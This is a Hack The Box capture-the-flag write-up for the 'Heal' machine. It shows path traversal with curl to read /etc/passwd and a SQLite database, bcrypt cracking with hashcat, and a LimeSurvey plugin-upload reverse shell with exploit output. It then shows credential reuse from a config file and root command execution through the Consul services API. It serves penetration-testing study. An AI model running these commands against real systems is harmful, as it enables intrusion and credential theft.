+++
title = "HTB - Heal"
date = "2025-04-21"
author = "dax"
cover = ""
tags = ["path-traversal", "hashcat", "lime-survey", "consul", "CVE-2021-44967"]
keywords = ["hacking", "htb", "heal", "hack the box"]
description = "Write-up of Hack The Box medium machine Heal"
showFullContent = false
readingTime = true
hideComments = false
color = "green"
+++

# HTB - Heal
## Enumeration:
Nmap
```bash
# Nmap 7.95 scan initiated Wed Apr  2 20:03:11 2025 as: /usr/lib/nmap/nmap -v -p - -Pn -T4 -A -oN nmaptcp heal.htb
Warning: 10.10.11.46 giving up on port because retransmission cap hit (6).
Nmap scan report for heal.htb (10.10.11.46)
Host is up (0.022s latency).
Not shown: 65472 closed tcp ports (reset), 61 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Heal
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 800D9D6AD40E40173F19D5EE9752AC18
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Uptime guess: 23.646 days (since Mon Mar 10 04:36:59 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   21.70 ms 10.10.14.1
2   21.91 ms heal.htb (10.10.11.46)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  2 20:06:58 2025 -- 1 IP address (1 host up) scanned in 227.92 seconds
```

## User exploit

By visiting web port 80, we are greeted by a login page for a `Fast Resume Builder` application. 

![](/img/htb/heal/heal_htb_login.png)

We can use the `NEW HERE? SIGN UP` link to create an account and access the app. At the bottom of the `/resume` page, there is an `EXPORT AS PDF` button that takes the HTML code of the resume form and returns a generated PDF file name. We then hit the `/download` endpoint that has a `filename` query parameter (to see it, be sure to check `Other binary` in the HTTP history filter or `Burp`). We can exploit a path traversal vulnerability in the `filename` parameter and retrieve files from the filesystem. 

```bash
curl --path-as-is -s -k -H $'Host: api.heal.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' $'http://api.heal.htb/download?filename=../../../../../../etc/passwd'
```

We can now use `ffuf` to try to find interesting files. Note that the web app is very sensitive to fuzzing, so we have to dial the speed down to get good results. 

```bash
ffuf -u http://api.heal.htb/download?filename=../../../../../..FUZZ -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -H 'Host: api.heal.htb' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' -t 1
```

This returns quite a few results, but one that pops out is `/proc/self/fd/15`. If we try to download the file, we can see that it is the file descriptor for the SQLite database that the web app is using. We can find a `users` table that contains hashes for `ralph@heal.htb`, which we can crack with `hashcat`. The hash type is `bcrypt $2*$, Blowfish (Unix)`, which is mode `3200`. 

```batch
hashcat.exe -m 3200 heal.hashes rockyou.txt
```

We now have a set of credentials, but we don't know where to use them yet (since they don't work for SSH login). By navigating through the application, we see a `SURVEY` button at the top of the page, which leads to another page with a `TAKE THE SURVEY` button. This takes us to another vhost (`take-survey.heal.htb`), and looking at the HTML source code we learn that it is a `LimeSurvey` server. By taking a look at their Github, we can quickly learn about the folder structure and find the `/admin` subfolder. This takes us to the `LimeSurvey` login page. 

![](/img/htb/heal/limesurvey_login.png)

By using the credentials we cracked, we can log in to the administration interface and access the software. At the bottom of the page, we can see in the footer that the version is `6.6.4`. This version is affected by an RCE vulnerability (CVE-2021-44967) through the installation of a malicious PHP plugin (like most software that allows the installation of custom plugins). The exploit is easy to use: clone the repository, edit the `revshell.php` file to include your listener's IP and port, ZIP the payload and use the exploit script. 

```bash
vi revshell.php
zip -r N4s1rl1.zip config.xml revshell.php
python exploit.py http://take-survey.heal.htb ralph 147258369 80
 _   _ _  _  ____  _ ____  _     _ 
| \ | | || |/ ___|/ |  _ \| |   / |
|  \| | || |\___ \| | |_) | |   | |
| |\  |__   _|__) | |  _ <| |___| |
|_| \_|  |_||____/|_|_| \_\_____|_|
                                   

[INFO] Retrieving CSRF token for login...
[SUCCESS] CSRF Token Retrieved: YkZjQWppQWpJUVA4UG1tNjBCdExuNUc3WWZwS1VZZ1f46E7VbcPOqmD31MppUCumD8HtStxI_50C6VAf2BD1CQ==

[INFO] Sending Login Request...
[SUCCESS] Login Successful!

[INFO] Uploading Plugin...
[SUCCESS] Plugin Uploaded Successfully!

[INFO] Installing Plugin...
[SUCCESS] Plugin Installed Successfully!

[INFO] Activating Plugin...
[SUCCESS] Plugin Activated Successfully!

[INFO] Triggering Reverse Shell...
```

Now that we have access as `www-data`, we can start poking around the files we have access to. We eventually stumble upon the `LimeSurvey` configuration in `/var/www/limesurvey/application/config/config.php`, which contains the PostgreSQL connexion string. 

```
'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
```

While this password doesn't work for the `ralph` user, it does work for the `ron` user (that we can see in the `/etc/passwd` file). We can now log in to the SSH port as `ron` and get the user flag. 

## Root exploit

By looking at the open ports using `ss -naltp`, we can spot a few ports that are only accessible to localhost. Specifically, we find port `8500` that we can forward to our machine using SSH local port forwarding. 

```bash
ssh -L 8500:127.0.0.1:8500 ron@heal.htb
```

We can now access this port on localhost:8050, which is a `Consul` server. 

![](/img/htb/heal/consul.png)

There is a unauthenticated remote command execution vulnerability in the services API. The exploit works by registering a new service and adding the malicious command as a health check for this service. We can find the PoC on Github and exploit it to get the root flag, since the service runs as root. 

```bash
python consul_rce.py -th localhost -tp 8500 -c '/usr/bin/cp /root/root.txt /tmp/root.txt'
python consul_rce.py -th localhost -tp 8500 -c '/usr/bin/chmod 777 /tmp/root.txt'
```

## Resources:

| Hyperlink                                       | Info                                                         |
| ----------------------------------------------- | ------------------------------------------------------------ |
| https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE | Limesurvey-6.6.4-RCE                                         |
| https://github.com/owalid/consul-rce            | Hashicorp Consul - Remote Command Execution via Services API |
| https://github.com/ffuf/ffuf                    | ffuf                                                         |
| https://github.com/hashcat/hashcat              | hashcat                                                      |
| https://github.com/LimeSurvey/LimeSurvey        | LimeSurvey                                                   |
| https://github.com/hashicorp/consul             | Consul                                                       |
